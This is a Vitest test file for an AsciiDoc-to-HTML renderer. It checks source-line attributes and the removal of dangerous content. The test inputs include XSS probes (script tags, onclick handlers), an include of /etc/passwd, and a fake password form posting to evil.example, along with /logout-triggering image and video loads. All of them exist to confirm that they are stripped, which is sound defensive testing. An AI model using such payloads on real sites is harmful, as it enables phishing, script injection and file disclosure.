// @vitest-environment jsdom
import {describe, expect, test} from 'vitest';
import {renderAsciidoc} from '../src/asciidoc';

const doc = `= Title

== Section A

Para one
line two.

* item 1
* item 2
+
continued

[source,c]
----
int x;
----
`;

describe('renderAsciidoc', () => {
  test('adds source lines to blocks, the end at the next block', async () => {
    const html = await renderAsciidoc(doc);
    expect(html).toContain('<h1>Title</h1>');
    expect(html).toContain('class="sect1" data-line-start="3" data-line-end="17"');
    expect(html).toContain('class="paragraph" data-line-start="5" data-line-end="8"');
    expect(html).toContain('class="ulist" data-line-start="8" data-line-end="13"');
    expect(html).toContain('data-line-start="9" data-line-end="13"');
    expect(html).toContain('class="listingblock" data-line-start="13" data-line-end="17"');
  });

  test('ignores line attributes in passthrough HTML', async () => {
    const html = await renderAsciidoc(
      'Text pass:[<span data-line-start="1" data-line-end="1" class="rd-line-1-1">x</span>]\n'
    );
    expect(html).toContain('<span class="rd-line-1-1">x</span>');
    expect(html.match(/data-line-start/g)).toHaveLength(1);
  });

  test('counts the title and attribute lines above a block', async () => {
    const html = await renderAsciidoc('First para.\n\n.My listing title\n[source,c]\n----\nint x;\n----\n');
    expect(html).toContain('class="paragraph" data-line-start="1" data-line-end="3"');
    expect(html).toContain('class="listingblock" data-line-start="3" data-line-end="8"');
    const crlf = await renderAsciidoc('First para.\r\n\r\n.My listing title \r\n[source,c]\r\n----\r\nint x;\r\n----\r\n');
    expect(crlf).toContain('class="listingblock" data-line-start="3" data-line-end="8"');
  });

  test('removes the mark of added blocks from passthrough HTML', async () => {
    const html = await renderAsciidoc('pass:[<span data-added>x</span>]\n');
    expect(html).not.toContain('data-added');
  });

  test('keeps the other classes of a block', async () => {
    const html = await renderAsciidoc('NOTE: text\n');
    expect(html).toContain('class="admonitionblock note" data-line-start="1"');
  });

  test('removes scripts from passthrough blocks', async () => {
    const html = await renderAsciidoc(
      '++++\n<script>alert(1)</script><b onclick="alert(2)">x</b>\n++++\n'
    );
    expect(html).not.toContain('<script');
    expect(html).not.toContain('onclick');
    expect(html).toContain('<b>x</b>');
  });

  test('does not include other files', async () => {
    const html = await renderAsciidoc('include::/etc/passwd[]\n');
    expect(html).not.toContain('root:');
  });

  test('shows alt text for relative images', async () => {
    const html = await renderAsciidoc('image::img/a.png[diagram]\n');
    expect(html).not.toContain('<img');
    expect(html).toContain('<span class="image-alt">[diagram]</span>');
  });

  test('links web images instead of loading them', async () => {
    const html = await renderAsciidoc('image::https://example.com/a.png[logo]\n');
    expect(html).not.toContain('<img');
    expect(html).toContain('<a href="https://example.com/a.png" class="image-alt">[logo]</a>');
  });

  test('loads data images', async () => {
    const html = await renderAsciidoc('image::data:image/png;base64,iVBO[dot]\n');
    expect(html).toContain('<img src="data:image/png;base64,iVBO" alt="dot"');
  });

  test('removes forms, styles and other loads from passthrough blocks', async () => {
    const html = await renderAsciidoc(
      '++++\n<p>a</p><style>:host{position:fixed}</style>' +
        '<form action="https://evil.example/c"><input type="password"><button>Go</button></form>' +
        '<div style="position:fixed">x</div><img src="data:image/png;base64,iVBO" srcset="/logout 1x">' +
        '<video poster="/logout" src="/logout"></video><svg><image href="/logout"/></svg>\n++++\n' +
        'video::/logout[]\n'
    );
    for (const text of ['<style', '<form', '<input', '<button', 'style=', 'srcset', '<video', 'poster', '<svg', '/logout']) {
      expect(html).not.toContain(text);
    }
  });
});
